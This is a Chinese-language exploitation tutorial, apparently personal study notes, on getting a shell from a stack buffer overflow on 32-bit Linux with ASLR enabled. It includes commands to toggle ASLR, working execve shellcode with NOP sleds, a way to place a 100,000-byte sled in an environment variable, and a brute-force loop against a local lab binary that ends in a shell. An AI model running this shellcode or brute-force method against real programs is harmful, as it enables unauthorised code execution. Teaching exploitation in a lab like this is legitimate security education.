# Shellcode injection with ASLR



​	前面我们讨论了在ASLR没有开启的情况下如何通过ret2shellcode方式利用栈溢出getshell。
​	ASLR技术开启，可以允许程序把段地址随机化，一旦开启了地址随机化，我们就很难再正确地定位buffer的地址了。程序的每一次运行，其内存地址都会发生改变，所以之前那种硬编码 shellcode地址 为执行子函数的返回地址的办法就会失效了。在这一节中我们要尝试开启ASLR：

禁用ASLR

`echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`

开启ASLR

`echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space`



#### Scenario 1: With `nop - \x90` sled. 	情景1： 使用nop滑行



假设我添加一些nop在我的shellcode前面

#### NOP
> 在CS领域中, NOP, no-op 和 NOOP (读作 "no op"; 是no operation的缩写) 都是指一个汇编指令, 编程语言的声明, 一种让cpu什么都不做的指令, 我们称呼它叫空指令



那我们就试试在shellcode前面添加 20 个 `nop` 

`python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print "\x90"*20+shellcode+"\x90"*(bufferlen-len(shellcode)-20)+"BBBB"+struct.pack("<I", starting address of the buffer)'`

​	然后我们就可以让我们的return address指向从buffer的起始地址开始到shellcode的起始地址（buffer的起始地址+20）之间的任意一个地址，这样我们都能spwan出一个shell来。那么，也就是说我们增加了能够获取shell的机会，有了更多的机会可以spwan到shell而不是只有一个机会。

​	通过调试观察我们可以看到buffer的起始地址的形式类似于这样：`0xff_ _ _ _ _ _ _`  前面会有几个byte是不会变化的，在这个例子中前两个byte： ' 0xff ' 是固定的，因为buffer位于memory的上部。

为了验证，我们编写一个简单的C程式：
```C
int main(){
    int a;
    printf("%p\n", &a);
    return 0;
}
```

编译并重复执行这个程式10次
```bash
$ for i in {1..10};do ./a.out;done
0xffe918bc
0xffdc367c
0xffeaf37c
0xffc31ddc
0xffc6a56c
0xffbcf9bc
0xffbcf02c
0xffbf1dcc
0xfffe386c
0xff9547cc
```
​	

​	我们可以看到和我们设想的一致，0xff开头是固定的。ps: 如果你不相信，可以对程序进行更多的测试。
似乎每一次执行变量a都会从stack中的不同地址加载出来，这个地址可以表示为 0xffXXXXXc (X是十六进制数)
经过更多的测试，我们可以发现规律：地址中的最后半个byte (这里的'c') 取决于变量在程序中的相对位置.
总的来说，变量在stack中的地址是0xffXXXXXX，可以计算一下有 16^6 = 16777216 这么多种可能.
​	容易看出，如果使用我们前面提到的方法, 我们有 21/16777216 的可能可以spwan到shell (21 是空指令滑行的长度, 只要我们的return address能跳到我们的NOP出现的地方就都可以滑行到我们的shellcode并执行shellcode).
​	这意味着平均来说程序每执行大约40k次，shellcode就会被执行一次，这个概率很小，但我们可以从中得到启发，我们可以增加buffer中空指令滑行的长度，但buffer的长度是受限的。增加“nop”的大小将增加shell代码运行的机会。但具体该怎样做呢？

为什么不借助环境变量 **environment variable** ?



#### Scenario 2: Putting long shellcode in env variable 情景2：把shellcode放到环境变量中



​	在我的 vagrant 系统中，我可以让环境变量的大小远远大于buffer的大小，我的系统允许环境变量的大小可以多达 100K
​	我们选择使用环境变量的原因是：它本身就是在stack的上方加载的。

让我们来创建一个名叫 SHELLCODE 的环境变量：
`export SHELLCODE=$(python -c 'print "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
`

​	替代之前的把return address设为buffer的起始地址，我们这次将把return address设为任意随机的内存中的高位地址，
我们假设在最高地址 `0xffffffff` 和 `0xff9547cc` 之间挑选，我这里选择 `0xff882222`

`$ for i in {1..100}; do ./exploit_me_3 $(python -c 'import struct;print "A"*112 + struct.pack("<I", 0xff882222)'); done`

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$whoami
vagrant
```

经过了几次尝试之后，我们拿到了shell  ！！
